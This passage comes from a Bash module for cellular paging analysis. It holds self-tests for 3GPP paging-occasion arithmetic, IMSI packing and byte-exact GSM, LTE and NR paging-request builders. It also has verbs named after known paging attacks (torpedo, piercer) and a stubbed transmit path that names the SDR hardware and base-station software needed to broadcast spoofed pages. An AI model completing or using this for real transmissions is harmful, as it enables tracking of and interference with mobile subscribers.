    chk plan-piercer-status "$(printf '%s\n' "$out" | grep -c '^status: handoff')" "1"
    pf=$(find "$PGT_PLAN_DIR" -name 'plan_torpedo_*.txt' | head -n1)
    chk plan-file-radio "$([[ "$(grep -ci 'USRP\|LimeSDR\|base-station' "$pf")" -ge 1 ]] && echo yes || echo no)" "yes"
    chk plan-file-handoff "$(grep -c '^status: handoff' "$pf")" "1"
    chk plan-unknown "$(pgt_plan nope >/dev/null 2>&1; echo $?)" "2"

    # 11. Verb validation.
    chk v-po-missing "$(pgt_cmd_po >/dev/null 2>&1; echo $?)" "2"
    chk v-po-bad-gen "$(pgt_cmd_po 310150123456789 6 watts >/dev/null 2>&1; echo $?)" "2"
    chk v-parse-missing "$(pgt_cmd_paging_parse >/dev/null 2>&1; echo $?)" "2"
    chk v-torpedo-missing "$(pgt_cmd_torpedo >/dev/null 2>&1; echo $?)" "2"
    chk v-piercer-missing "$(pgt_cmd_piercer >/dev/null 2>&1; echo $?)" "2"
    chk v-detect-missing "$(pgt_cmd_detect >/dev/null 2>&1; echo $?)" "2"

    # 12. Status TSV invariants.
    out=$(pgt_cli_status_tsv)
    chk status-dir "$(fld "$out" dir)" "$PGT_DIR"
    chk status-tag "$(fld "$out" tag)" "pgt"

    # 13. eDRX TeDRX table and PTW arithmetic (TS 36.304 7.4).
    # The table is normative: index -> seconds, so both directions are checked.
    chk edrx-idx0-sec  "$(pgt_edrx_seconds 0)"  "5.12"
    chk edrx-idx3-sec  "$(pgt_edrx_seconds 3)"  "40.96"
    chk edrx-idx6-sec  "$(pgt_edrx_seconds 6)"  "102.4"
    chk edrx-idx15-sec "$(pgt_edrx_seconds 15)" "10485.76"
    chk edrx-idx-oob    "$(pgt_edrx_seconds 16 >/dev/null 2>&1; echo $?)" "1"
    chk edrx-idx-neg    "$(pgt_edrx_seconds -1 >/dev/null 2>&1; echo $?)" "1"
    chk edrx-sec-to-idx-1024  "$(pgt_edrx_index 10.24)" "1"
    chk edrx-sec-to-idx-5242  "$(pgt_edrx_index 5242.88)" "14"
    # A value that is not a normative cycle must NOT snap to a neighbour.
    chk edrx-sec-to-idx-bad   "$(pgt_edrx_index 5 >/dev/null 2>&1; echo $?)" "1"
    chk edrx-sec-to-idx-bad2  "$(pgt_edrx_index 12 >/dev/null 2>&1; echo $?)" "1"
    # PTW length = 2^(PTW+4) radio frames (TS 36.304 7.4).
    chk edrx-ptw0  "$(pgt_ptw_frames 0)"  "16"
    chk edrx-ptw4  "$(pgt_ptw_frames 4)"  "256"
    chk edrx-ptw15 "$(pgt_ptw_frames 15)" "524288"
    chk edrx-ptw-oob "$(pgt_ptw_frames 16 >/dev/null 2>&1; echo $?)" "1"

    # PTW start H-SFN = (TeDRX_HFN * (UE_ID mod 1024)) mod 1024 (36.304 7.4).
    # TeDRX=10.24 s -> 1024 frames -> 1 H-SFN per cycle; UE_ID 277 -> 277.
    out=$(pgt_edrx_occ 310150123456789 10.24 2 64)
    chk edrx-occ-ueid     "$(fld "$out" ue_id)" "277"
    chk edrx-occ-idx      "$(fld "$out" te_drx_index)" "1"
    chk edrx-occ-frames   "$(fld "$out" te_drx_frames)" "1024"
    chk edrx-occ-hsfn     "$(fld "$out" te_drx_hsfn)" "1"
    chk edrx-occ-ptwfr    "$(fld "$out" ptw_frames)" "64"
    chk edrx-occ-starthfn "$(fld "$out" ptw_start_hsfn)" "277"
    chk edrx-occ-startfr  "$(fld "$out" ptw_start_frame)" "283648"
    chk edrx-occ-endfr    "$(fld "$out" ptw_end_frame)" "283711"
    chk edrx-occ-status   "$(fld "$out" status)" "computed"
    # The window must contain whole DRX cycles: 64 frames of PTW at T=64 is 1.
    chk edrx-occ-pocount  "$(fld "$out" po_count_in_ptw)" "1"
    # Index and seconds are two spellings of the same cycle.
    out2=$(pgt_edrx_occ 310150123456789 1 2 64)
    chk edrx-occ-idx-sec-same "$(fld "$out2" ptw_start_hsfn)" "277"
    # A 1-H-SFN cycle (10.24 s) at UE_ID 0 starts the window at H-SFN 0.
    out=$(pgt_edrx_occ 0 10.24 0 64)
    chk edrx-occ-zero-ue  "$(fld "$out" ptw_start_hsfn)" "0"
    chk edrx-occ-zero-ptw "$(fld "$out" ptw_frames)" "16"
    # TeDRX of 10485.76 s = 1048576 frames = 1024 H-SFNs: a full wrap, so
    # TeDRX_HFN mod 1024 == 0 and every UE_ID collapses to a zero start.
    out=$(pgt_edrx_occ 310150123456789 15 0 64)
    chk edrx-occ-max-wrap "$(fld "$out" ptw_start_hsfn)" "0"
    chk edrx-occ-max-hfn  "$(fld "$out" te_drx_hsfn)" "1024"
    chk edrx-occ-bad-ue   "$(pgt_edrx_occ not-a-ue 1 2 >/dev/null 2>&1; echo $?)" "1"
    chk edrx-occ-missing  "$(pgt_edrx_occ >/dev/null 2>&1; echo $?)" "2"

    # 14. NR PEI occasion and subgroup (TS 38.304 7.2).
    # T=64, nB=64 -> N=64, Ns=1, T/N=1, so PF = UE_ID mod 64 for PF_offset 0
    # (TS 38.304 7.1: (SFN + PF_offset) mod T = (T div N)*(UE_ID mod N)).
    # UE_ID 33 -> PF 33, i_s 0. The PEI monitoring occasion is the one-frame
    # offset before the PO (TS 38.304 7.2), i.e. frame 32.
    out=$(pgt_pei_occ 33 64 64 0 2)
    chk pei-ueid      "$(fld "$out" ue_id)" "33"
    chk pei-pf        "$(fld "$out" pf_sfn)" "33"
    chk pei-sg-count  "$(fld "$out" subgroups)" "2"
    # subgroup = UE_ID mod N_subgroup (TS 38.304 7.2): 33 mod 2 = 1.
    chk pei-subgroup  "$(fld "$out" subgroup)" "1"
    chk pei-frame     "$(fld "$out" pei_frame)" "32"
    chk pei-wake      "$(fld "$out" wake_frames_before_po)" "1"
    chk pei-wus       "$(fld "$out" wus_frame)" "32"
    # 4 subgroups: 33 mod 4 = 1.
    chk pei-subgroup4 "$(fld "$(pgt_pei_occ 33 64 64 0 4)" subgroup)" "1"
    # 1 subgroup: everything is subgroup 0.
    chk pei-subgroup1 "$(fld "$(pgt_pei_occ 33 64 64 0 1)" subgroup)" "0"
    # A 5G-S-TMSI is reduced mod 1024 before the PF is computed. The 48-bit
    # 5G-S-TMSI 0x000000000066 = 102 decimal -> UE_ID 102 -> PF 38
    # (TS 38.304 7.1). A 10-digit spelling is NOT a 5G-S-TMSI; the 12-hex
    # form is. This is the case that caught a real bug: awk does not coerce
    # "0x.." strings, so the reduction silently returned 0.
    out=$(pgt_pei_occ 000000000066 64 64 0 2)
    chk pei-5gtmsi-ueid  "$(fld "$out" ue_id)" "102"
    chk pei-5gtmsi-pf    "$(fld "$out" pf_sfn)" "38"
    chk pei-5gtmsi-sg    "$(fld "$out" subgroup)" "0"
    chk pei-5gtmsi-raw   "$(fld "$out" 5g_s_tmsi)" "000000000066"
    # 0x-prefixed spelling must reduce identically.
    chk pei-5gtmsi-0x    "$(fld "$(pgt_pei_occ 0x000000000066 64 64 0 2)" ue_id)" "102"
    # A 5G-S-TMSI whose low 10 bits matter: the 48-bit 0x0000fffffffe
    # = 4294967294, mod 1024 = 1022 (exactly 12 hex digits, which is what a
    # 5G-S-TMSI is; a shorter string is NOT treated as one).
    chk pei-5gtmsi-wrap  "$(fld "$(pgt_pei_occ 0000fffffffe 64 64 0 1)" ue_id)" "1022"
    # A non-power-of-two subgroup count is invalid (TS 38.304 7.2).
    chk pei-sg-bad    "$(pgt_pei_occ 33 64 64 0 3 >/dev/null 2>&1; echo $?)" "1"
    chk pei-sg-zero   "$(pgt_pei_occ 33 64 64 0 0 >/dev/null 2>&1; echo $?)" "1"
    chk pei-missing   "$(pgt_pei_occ >/dev/null 2>&1; echo $?)" "2"
    # The PEI must always precede the PO, never coincide with it.
    out=$(pgt_pei_occ 33 64 64 0 2)
    chk pei-before-po "$(( $(fld "$out" pei_frame) < $(fld "$out" po_frame) ))" "1"

    # 15. GSM Page Mode and Channel Needed packing (TS 44.018 10.5).
    # 0621 10 ... : one shared type-1 octet, Page Mode LOW nibble = 0
    # (normal paging), Channel Needed HIGH nibble = 1 (SDCCH, first field).
    out=$(pgt_page_mode 0621103112345678)
    chk pm-msg-type   "$(fld "$out" message_type)" "1"
    chk pm-shared-oct "$(fld "$out" type1_shared_octet)" "0x10"
    chk pm-pm         "$(fld "$out" page_mode)" "normal_paging"
    chk pm-pm-bits    "$(fld "$out" page_mode_bits)" "0"
    chk pm-cn         "$(fld "$out" channel_needed)" "sdcch"
    chk pm-cn-first   "$(fld "$out" channel_needed_first_bits)" "1"
    chk pm-cn-second  "$(fld "$out" channel_needed_second_bits)" "0"
    chk pm-cs         "$(fld "$out" cs_page)" "yes"
    # Page Mode values 01/10/11 (TS 44.018 table 10.5.2.26.1). "Same as
    # before" is a real value: an earlier revision mis-printed it reserved.
    chk pm-extended "$(fld "$(pgt_page_mode 062111)" page_mode)" "extended_paging"
    chk pm-reorg    "$(fld "$(pgt_page_mode 062112)" page_mode)" "paging_reorganization"
    chk pm-same     "$(fld "$(pgt_page_mode 062113)" page_mode)" "same_as_before"
    # Channel Needed values 10/11 -> TCH/F and TCH/H-or-TCH/F (10.5.2.8).
    chk pm-tchf   "$(fld "$(pgt_page_mode 062120)" channel_needed)" "tch_f"
    chk pm-tchh   "$(fld "$(pgt_page_mode 062130)" channel_needed)" "tch_h_or_tch_f"
    chk pm-ieis   "$(fld "$(pgt_page_mode 062100)" channel_needed_iei_bit8)" "0"
    # A whole message may carry a leading L2 pseudo length octet.
    out=$(pgt_page_mode 080621103112345678)
    chk pm-l2-lead      "$(fld "$out" l2_pseudo_length_octet)" "0x08"
    chk pm-l2-lead-pm   "$(fld "$out" page_mode)" "normal_paging"
    # TYPE 2 and TYPE 3 share the same first octet layout.
    chk pm-type2 "$(fld "$(pgt_page_mode 062210)" message_type)" "2"
    chk pm-type3 "$(fld "$(pgt_page_mode 062310)" message_type)" "3"
    chk pm-bad   "$(pgt_page_mode zz >/dev/null 2>&1; echo $?)" "2"
    chk pm-missing "$(pgt_page_mode >/dev/null 2>&1; echo $?)" "2"

    # 16. Paging cause and CN domain (TS 38.331 6.3.2, 24.501).
    out=$(pgt_paging_cause 00 nr)
    chk cause-nr-voice "$(fld "$out" paging_cause)" "voice"
    chk cause-nr-wakes "$(fld "$out" wakes_for_incoming_call)" "yes"
    chk cause-nr-video "$(fld "$(pgt_paging_cause 01 nr)" paging_cause)" "video"
    chk cause-nr-sms   "$(fld "$(pgt_paging_cause 02 nr)" paging_cause)" "sms"
    chk cause-nr-other "$(fld "$(pgt_paging_cause 03 nr)" paging_cause)" "other"
    # Only a voice cause is an incoming call; sms must not be reported as one.
    chk cause-nr-sms-nowake "$(fld "$(pgt_paging_cause 02 nr)" wakes_for_incoming_call)" "no"
    # LTE carries no cause; absent cn-Domain means PS (TS 36.331 6.3.2).
    out=$(pgt_paging_cause 00 lte)
    chk cause-lte-cn     "$(fld "$out" cn_domain)" "ps"
    chk cause-lte-none   "$(fld "$out" paging_cause)" "not_applicable"
    # GSM has no cause field at all; it must not be invented.
    chk cause-gsm-none "$(fld "$(pgt_paging_cause 00 gsm)" paging_cause)" "not_applicable"
    chk cause-bad-gen  "$(pgt_paging_cause 00 wcdma >/dev/null 2>&1; echo $?)" "2"
    chk cause-bad-hex  "$(pgt_paging_cause zz nr >/dev/null 2>&1; echo $?)" "2"
    chk cause-missing  "$(pgt_paging_cause >/dev/null 2>&1; echo $?)" "2"

    # 17. Paging-message construction, byte-exact, both directions.
    # TS 44.018 9.1.22: L2 pseudo length = the sum of every IE except the L2
    # Pseudo Length octet and the P1 Rest Octets = protocol disc + skip ind
    # (1) + message type (1) + the one shared Page Mode/Channel Needed octet
    # (1) + Mobile Identity 1. Page Mode occupies bits 1-4 of that shared
    # octet and Channel Needed bits 5-8 (figures 10.5.2.26.1 / 10.5.2.8.1).
    # A TYPE 1 page for a TMSI: L2 = 2 + 1 + 5 = 8; shared octet 0x10 (PM
    # normal = 00 in the low nibble; channel-needed first = SDCCH = 01 in bits
    # 5-4); then the 5-octet TMSI/P-TMSI type-3 IE, IEI 0x31 + 4 value octets
    # (TS 44.018 10.5.2.42).
    out=$(pgt_build_paging_req gsm "tmsi=12345678,page_mode=normal,channel_needed=sdcch,type=1")
    chk gsm-build-hex     "$(fld "$out" message_hex)" "080621103112345678"
    chk gsm-build-l2      "$(fld "$out" l2_pseudo_length)" "8"
    chk gsm-build-oct     "$(fld "$out" type1_shared_octet)" "10"
    chk gsm-build-ids     "$(fld "$out" identities)" "1"
    chk gsm-build-len     "$(fld "$out" length_octets)" "9"
    # The builder's own output must decode back to what went in.
    out=$(pgt_page_mode "$(fld "$out" message_hex)")
    chk gsm-build-rt-pm   "$(fld "$out" page_mode)" "normal_paging"
    chk gsm-build-rt-cn   "$(fld "$out" channel_needed)" "sdcch"
    # An IMSI page packs the identity as LV (TS 24.008 10.5.1.4). For
    # 310150123456789 pgt_pack_imsi yields 39 01 51 10 32 54 76 98 (8 octets),
    # so the LV is 08 + those 8 = 9 octets and L2 = 2 + 1 + 9 = 12.
    out=$(pgt_build_paging_req gsm "mi=310150123456789,page_mode=normal,channel_needed=any,type=1")
    chk gsm-imsi-hex "$(fld "$out" message_hex)" "0c062100083901511032547698"
    chk gsm-imsi-l2  "$(fld "$out" l2_pseudo_length)" "12"
    chk gsm-imsi-len "$(fld "$out" length_octets)" "13"
    # The IMSI page must decode back to the same digits it was built from.
    # message_hex = 0c 06 21 00 | 08 39 01 51 10 32 54 76 98; the LV content
    # begins after the L2 octet, the 2-octet header and the shared octet
    # (8 hex chars) plus its own length octet (2 more).
    chk gsm-imsi-rt "$(pgt_build_paging_req gsm "mi=310150123456789,page_mode=normal,channel_needed=any,type=1" \
        | awk -F'\t' '$1=="message_hex"{print $2}' | cut -c11-26)" "3901511032547698"
    # Two MSs: Page Mode 01 (extended) in bits 1-4 and Channel Needed with
    # first = SDCCH (01) in bits 5-4 and second = TCH/F (10) in bits 7-6,
    # giving the single shared octet 0x91.
    out=$(pgt_build_paging_req gsm "tmsi=12345678,page_mode=extended,channel_needed=sdcch,channel_needed_2=tch_f,type=1")
    chk gsm-two-cn-oct  "$(fld "$out" type1_shared_octet)" "91"
    out=$(pgt_page_mode "$(fld "$out" message_hex)")
    chk gsm-two-rt-pm   "$(fld "$out" page_mode)" "extended_paging"
    chk gsm-two-rt-cn1  "$(fld "$out" channel_needed_first_bits)" "1"
    chk gsm-two-rt-cn2  "$(fld "$out" channel_needed_second_bits)" "2"
    # TYPE 2 with two TMSIs: L2 = 2 + 1 + (5+5) = 13.
    out=$(pgt_build_paging_req gsm "tmsi=11111111,tmsi2=22222222,type=2")
    chk gsm-t2-l2  "$(fld "$out" l2_pseudo_length)" "13"
    chk gsm-t2-ids "$(fld "$out" identities)" "2"
    chk gsm-t2-pre "$(printf '%s' "$(fld "$out" message_hex)" | cut -c1-10)" "0d06220031"
    # TYPE 3 packs TMSI/P-TMSIs the same way. The spec fixes its L2 pseudo
    # length at 19 when all four identities are present; with two it is the
    # computed 2 + 1 + 10 = 13.
    out=$(pgt_build_paging_req gsm "tmsi=11111111,tmsi2=22222222,type=3")
    chk gsm-t3-pre "$(printf '%s' "$(fld "$out" message_hex)" | cut -c1-8)" "0d062300"
    chk gsm-t3-ids "$(fld "$out" identities)" "2"
    # tmsi is not valid hex, and an unknown key must both be rejected.
    chk gsm-bad-tmsi "$(pgt_build_paging_req gsm "tmsi=xyz,type=1" >/dev/null 2>&1; echo $?)" "1"
    chk gsm-bad-key  "$(pgt_build_paging_req gsm "nonsense=1" >/dev/null 2>&1; echo $?)" "2"
    chk gsm-no-spec  "$(pgt_build_paging_req gsm >/dev/null 2>&1; echo $?)" "2"
    # LTE S-TMSI = MMEC (8 bits) || M-TMSI (32 bits) (TS 23.003 2.4).
    out=$(pgt_build_paging_req lte "tmsi=89abcdef,ue_id=2f,cn=ps")
    chk lte-build-choice "$(fld "$out" ue_identity_choice)" "S-TMSI"
    chk lte-build-id     "$(fld "$out" ue_identity_hex)" "2f89abcdef"
    chk lte-build-bits   "$(fld "$out" ue_identity_bits)" "40"
    chk lte-build-mmec   "$(fld "$out" mmec)" "0x2f"
    chk lte-build-mtmsi  "$(fld "$out" m_tmsi)" "0x89abcdef"
    chk lte-build-cn     "$(fld "$out" cn_domain)" "ps"
    # An S-TMSI without its MMEC is incomplete, not silently guessed.
    chk lte-build-no-mmec "$(pgt_build_paging_req lte "tmsi=89abcdef" >/dev/null 2>&1; echo $?)" "2"
    # NR 5G-S-TMSI = AMF Set ID (10) || AMF Pointer (6) || 5G-TMSI (32),
    # 48 bits (TS 23.501 2.10.2). 0x0000000066 splits to 0 / 0 / 0x66.
    out=$(pgt_build_paging_req nr "tmsi=000000000066,cause=voice")
    chk nr-build-choice "$(fld "$out" ue_identity_choice)" "5G-S-TMSI"
    chk nr-build-5gtmsi "$(fld "$out" 5g_s_tmsi)" "000000000066"
    chk nr-build-5gt    "$(fld "$out" 5g_tmsi)" "0x00000066"
    chk nr-build-amfset "$(fld "$out" amf_set_id)" "0"
    chk nr-build-cause  "$(fld "$out" paging_cause)" "voice"
    # 5G-S-TMSI = AMF Set ID (bits 47-38) || AMF Pointer (bits 37-32) ||
    # 5G-TMSI (bits 31-0), TS 23.501 2.10.2. For 0xFFF000000ABC:
    # AMF Set ID = 0x3FF = 1023, AMF Pointer = (v >> 32) & 0x3F = 48,
    # 5G-TMSI = 0xABC.
    out=$(pgt_build_paging_req nr "tmsi=fff000000abc,cause=sms")
    chk nr-build-amfset2 "$(fld "$out" amf_set_id)" "1023"
    chk nr-build-amfp2   "$(fld "$out" amf_pointer)" "48"
    chk nr-build-5gt2    "$(fld "$out" 5g_tmsi)" "0x00000abc"
    chk nr-build-cause2  "$(fld "$out" paging_cause)" "sms"
    chk nr-build-bad-len "$(pgt_build_paging_req nr "tmsi=1234" >/dev/null 2>&1; echo $?)" "2"
    chk nr-build-bad-cause "$(pgt_build_paging_req nr "tmsi=000000000066,cause=bogus" >/dev/null 2>&1; echo $?)" "2"
    chk build-bad-gen "$(pgt_build_paging_req wcdma "x=1" >/dev/null 2>&1; echo $?)" "2"

    # 18. IMSI packing: the inverse of the mobile-identity parser.
    # TS 24.008 10.5.1.4. Octet 1 carries type 001, the odd/even indicator in
    # bit 4, and the FIRST digit in the high nibble; the rest follow two per
    # octet, LOW nibble first, with F filler when the digit count is odd.
    #   310150123456789 (15 digits, odd) -> 39 01 51 10 32 54 76 98
    #     0x39 = 001 | odd(1) | first digit 3; then the pairs 10 15 01 23 45
    #     67 89 are packed low-nibble-first, giving 01 51 10 32 54 76 98.
    #   20801123456789 (14 digits, even) -> 21 80 10 21 43 65 87 f9
    #     0x21 = 001 | even(0) | first digit 2.
    chk pack-imsi-odd  "$(pgt_pack_imsi 310150123456789)" "3901511032547698"
    # Independent known-answer vectors. The libosmocore test suite encodes
    # 123456789012345 as 19 32 54 76 98 10 32 54, and pgt_parse_mi already
    # asserts that it DECODES those exact octets. Packing the same digits must
    # reproduce them, so this direction is pinned to a published independent
    # implementation rather than to this module's own output.
    chk pack-libosmocore-odd "$(pgt_pack_imsi 123456789012345)" "1932547698103254"
    chk pack-libosmocore-even "$(pgt_pack_imsi 12345678901234)" "11325476981032f4"
    chk pack-imsi-bad  "$(pgt_pack_imsi 12345 >/dev/null 2>&1; echo $?)" "1"
    chk pack-imsi-alpha "$(pgt_pack_imsi 12345a >/dev/null 2>&1; echo $?)" "1"
    # Round-trip against the module's own parser, in both directions.
    local imsi_rt
    for imsi_rt in 310150123456789 20801123456789 001010000000001 123456 123456789012345; do
        local packed got
        packed=$(pgt_pack_imsi "$imsi_rt") || { chk "pack-rt-$imsi_rt" "pack-failed" "ok"; continue; }
        got=$(pgt_parse_mi "$packed" | awk -F'\t' '$1=="identity"{print $2; exit}')
        chk "pack-roundtrip-$imsi_rt" "$got" "$imsi_rt"
    done
    # The parser must report the type and parity that the packer encoded.
    chk pack-parse-type "$(pgt_parse_mi 3901511032547698 | awk -F'\t' '$1=="identity_type"{print $2; exit}')" "IMSI"
    chk pack-parse-odd  "$(pgt_parse_mi 3901511032547698 | awk -F'\t' '$1=="odd_even"{print $2; exit}')" "odd"
    chk pack-parse-even "$(pgt_parse_mi 21801021436587f9 | awk -F'\t' '$1=="odd_even"{print $2; exit}')" "even"

    # 19. Paging history aggregation and the honest CLI guards.
    # Two captures are built from the module's own event extractor, so the
    # history path is exercised without a real pcap.
    local capdir="$d/caps"; mkdir -p "$capdir"
    printf 'identity\tkind\tts\tframe\tchannel\n111\trequest\t10.0\t1\tccch\n222\trequest\t10.1\t2\tccch\n' \
        > "$capdir/events1.tsv"
    # pgt_paging_history reads captures, not event dumps, so its argument
    # validation is asserted here rather than a fabricated capture.
    chk hist-missing-arg "$(pgt_paging_history >/dev/null 2>&1; echo $?)" "2"
    chk hist-no-such     "$(pgt_paging_history "$capdir/nope.pcap" >/dev/null 2>&1; echo $?)" "2"

    # 20. Honest-fail transmit path names a real blocker and never lies.
    local fakecap="$capdir/fake.pcap"; printf 'x' > "$fakecap"
    out=$(pgt_tx_paging "$fakecap" 2>/dev/null); local trc=$?
    chk tx-rc       "$trc" "3"
    chk tx-status   "$(fld "$out" status)" "blocked"
    chk tx-ready    "$(fld "$out" protocol_content_ready)" "yes"
    chk tx-no-sdr   "$(printf '%s' "$(fld "$out" requires_sdr)" | grep -ci 'usrp\|bladerf')" "1"
    chk tx-missing  "$(pgt_tx_paging >/dev/null 2>&1; echo $?)" "0"
    chk tx-no-file  "$(pgt_tx_paging "$capdir/absent.pcap" >/dev/null 2>&1; echo $?)" "2"
    # "protocol_content_ready yes" must be EARNED: the verb has to print the
    # exact octets it would transmit. An empty built_message here is the
    # unearned claim this assertion exists to prevent.
    chk tx-built-nonempty "$([[ -n "$(fld "$out" built_message)" ]] && echo yes || echo no)" "yes"
    chk tx-built-hex     "$(fld "$out" built_message)" "080621103112345678"
    chk tx-built-octets  "$(fld "$out" built_octets)" "9"
    chk tx-built-l2      "$(fld "$out" built_l2_pseudo_length)" "8"
    # The octets the TX path reports must be the builder's own output, and the
    # builder must decode back to the spec that produced it.
    chk tx-built-matches-builder \
        "$(fld "$out" built_message)" \
        "$(pgt_build_paging_req gsm "tmsi=12345678,page_mode=normal,channel_needed=sdcch,type=1" \
            | awk -F'\t' '$1=="message_hex"{print $2}')"
    chk tx-built-decodes "$(pgt_page_mode "$(fld "$out" built_message)" | awk -F'\t' '$1=="page_mode"{print $2}')" "normal_paging"
    chk tx-built-cn     "$(pgt_page_mode "$(fld "$out" built_message)" | awk -F'\t' '$1=="channel_needed"{print $2}')" "sdcch"
    # The TX path must state the burst structure and the timing it would hold,
    # not only a device name (OFFENSIVE_ROADMAP condition 2).
    chk tx-burst  "$(printf '%s' "$(fld "$out" burst_structure)" | grep -ci 'burst')" "1"
    chk tx-timing "$(printf '%s' "$(fld "$out" timing)" | grep -ci 'multiframe\|ms')" "1"
    # An alternate spec can be driven in, and it must change the octets.
    out2=$(PGT_TX_SPEC="mi=310150123456789,page_mode=normal,channel_needed=any,type=1" \
        pgt_tx_paging "$fakecap" 2>/dev/null)
    chk tx-custom-spec "$(fld "$out2" built_message)" "0c062100083901511032547698"
    chk tx-custom-differs "$([[ "$(fld "$out2" built_message)" != "$(fld "$out" built_message)" ]] && echo yes || echo no)" "yes"
    # No success line may ever be printed by the transmit path.
    chk tx-no-success-line "$(printf '%s' "$out" | grep -ciE '^(OK|SUCCESS|sent|transmitted)\b')" "0"

    printf 'ASSERTIONS\t%d\n' "$nchk"
    rm -rf "$d"
    trap - EXIT
    printf 'RESULT\t%s\n' "$([[ $bad -eq 0 ]] && echo PASS || echo "FAIL($bad)")"
    return $(( bad > 0 ))
}

# ── CLI wrappers for the new verbs ──────────────────────────────────────
# Each accepts either a full command line (CLI use) or runs interactively
# with read -rp prompts when arguments are missing (menu use), matching the
# module's existing CLI/menu dual-entry convention.

pgt_cli_edrx_occ() {
    local ue="${1:-}" te="${2:-}" ptw="${3:-}" t="${4:-}" nb="${5:-}"
    if [[ -z "$ue" ]]; then
        read -rp "  IMSI or UE_ID (0-1023)> " ue || return 0
    fi
    if [[ -z "$te" ]]; then
        read -rp "  TeDRX (index 0-15 or seconds, e.g. 10.24)> " te || return 0
    fi
    if [[ -z "$ptw" ]]; then
        read -rp "  PTW (0-15)> " ptw || return 0
    fi
    if [[ -z "$t" ]]; then
        read -rp "  DRX T (32|64|128|256, blank = 64)> " t || return 0
        [[ -n "$t" ]] || t=64
    fi
    if [[ -z "$nb" ]]; then
        read -rp "  nB (blank = T)> " nb || true
    fi
    pgt_edrx_occ "$ue" "$te" "$ptw" "$t" "$nb"
}

pgt_cli_pei_occ() {
    local ue="${1:-}" t="${2:-}" nb="${3:-}" off="${4:-}" sg="${5:-}"
    if [[ -z "$ue" ]]; then
        read -rp "  5G-S-TMSI or UE_ID> " ue || return 0
    fi
    if [[ -z "$t" ]]; then
        read -rp "  T (32|64|128|256, blank = 32)> " t || return 0
        [[ -n "$t" ]] || t=32
    fi
    if [[ -z "$nb" ]]; then
        read -rp "  nB (blank = T)> " nb || true
    fi
    if [[ -z "$off" ]]; then
        read -rp "  PF_offset (0-3, blank = 0)> " off || return 0
        [[ -n "$off" ]] || off=0
    fi
    if [[ -z "$sg" ]]; then
        read -rp "  N_subgroup (1|2|4, blank = 1)> " sg || return 0
        [[ -n "$sg" ]] || sg=1
    fi
    pgt_pei_occ "$ue" "$t" "$nb" "$off" "$sg"
}

pgt_cli_paging_history() {
    if (($# == 0)); then
        local p; read -rp "  captures (space-separated)> " -a pcaps || return 0
        ((${#pcaps[@]})) || return 0
        local f=0
        read -rp "  flapping only? (y/N)> " yn || true
        [[ "$yn" =~ ^[Yy] ]] && f=1
        if (( f )); then pgt_paging_history --flapping-tsv "${pcaps[@]}"
        else pgt_paging_history "${pcaps[@]}"; fi
        return
    fi
    pgt_paging_history "$@"
}

pgt_cli_paging_cause() {
    local x="${1:-}" gen="${2:-}"
    if [[ -z "$x" ]]; then
        read -rp "  hex octet/IE> " x || return 0
    fi
    if [[ -z "$gen" ]]; then
        read -rp "  generation (gsm|lte|nr, blank = nr)> " gen ||return 0
        [[ -n "$gen" ]] || gen=nr
    fi
    pgt_paging_cause "$x" "$gen"
}

pgt_cli_page_mode() {
    local x="${1:-}"
    [[ -n "${2:-}" ]] && x="$1$2"
    if [[ -z "$x" ]]; then
        read -rp "  RR octets (e.g. 0621 08)> " x || return 0
    fi
    pgt_page_mode "$x"
}

pgt_cli_build_paging_req() {
    local gen="${1:-}" spec="${2:-}"
    if [[ -z "$gen" ]]; then
        read -rp "  generation (gsm|lte|nr)> " gen || return 0
    fi
    if [[ -z "$spec" ]]; then
        case "$gen" in
            gsm) read -rp "  k=v (mi=<imsi>,page_mode=0,channel_needed=ANY[,type=1])> " spec || return 0 ;;
            lte) read -rp "  k=v (tmsi=<8hex>,ue_id=<2hex mmec>[,cn=ps])> " spec || return 0 ;;
            nr)  read -rp "  k=v (tmsi=<12hex 5G-S-TMSI>[,cause=voice])> " spec || return 0 ;;
            *)   err "unknown generation: $gen"; return 2 ;;
        esac
    fi
    pgt_build_paging_req "$gen" "$spec"
}

pgt_tx_paging() {
    # Layer 1 of a paging transmitter does not exist in this toolkit, so the
    # honest-fail path is the contract (like 15_downgrade's TX). It names the
    # exact SDR and the exact build each backend would need.
    #
    # The protocol half IS real: rather than asserting "content ready" and
    # printing nothing, build the paging request this path would transmit and
    # show the exact octets. That is condition 1 of the TX contract -- the
    # construction is spec-derived and byte-exact -- while the radio hop stays
    # an explicit handoff.
    local pcap="${1:-}"
    if [[ -z "$pcap" ]]; then
        read -rp "  pcap to replay as paging> " pcap || return 0
    fi
    [[ -n "$pcap" ]] || return 2
    [[ -f "$pcap" ]] || { printf 'ERROR\tno such capture: %s\n' "$pcap" >&2; return 2; }

    # Default to the worked TYPE 1 example the selftest pins: a TMSI page with
    # normal paging and SDCCH needed, which encodes to 08 06 21 10 31 ...
    local spec="${PGT_TX_SPEC:-tmsi=12345678,page_mode=normal,channel_needed=sdcch,type=1}"
    local built; built=$(pgt_build_paging_req gsm "$spec") || {
        printf 'ERROR\tcould not build the paging request from spec: %s\n' "$spec" >&2
        return 2
    }
    local mhex; mhex=$(printf '%s\n' "$built" | awk -F'\t' '$1=="message_hex"{print $2}')
    local l2;   l2=$(printf '%s\n' "$built" | awk -F'\t' '$1=="l2_pseudo_length"{print $2}')
    [[ -n "$mhex" ]] || { printf 'ERROR\tbuilder produced no message\n' >&2; return 2; }

    printf 'status\tblocked\n'
    printf 'blocked_reason\t%s\n' "layer 1 paging transmitter is not implemented"
    printf 'backend\t%s\n' "none available in this build"
    printf 'requires_sdr\t%s\n' "Ettus USRP B210 (or N210) driven by srsRAN (srsRAN_4G) or a bladeRF 2.0 micro via YateBTS; the SDR must support the target band's duplex mode and the minimum 2.56 s paging-cycle timing"
    printf 'requires_software\t%s\n' "srsRAN_4G is the only stack in reach that both builds a paging transmitter and accepts an external core; osmocom's OsmoBTS does not TX paging standalone"
    printf 'why_not_lte_nr\t%s\n' "the paging message built by --build-paging-req is RRC/NAS content; transmitting it needs a full RRC stack with a valid SFN and SIB1, not a raw frame injector"
    printf 'protocol_content_ready\t%s\n' "yes"
    printf 'built_spec\t%s\n' "$spec"
    printf 'built_message\t%s\n' "$mhex"
    printf 'built_l2_pseudo_length\t%s\n' "$l2"
    printf 'built_octets\t%d\n' "$(( ${#mhex} / 2 ))"
    printf 'burst_structure\t%s\n' "the message is carried in one PCH block: 4 bursts of 114 coded bits in one TDMA time slot on the CCCH/PCH, whose position comes from the paging block index"
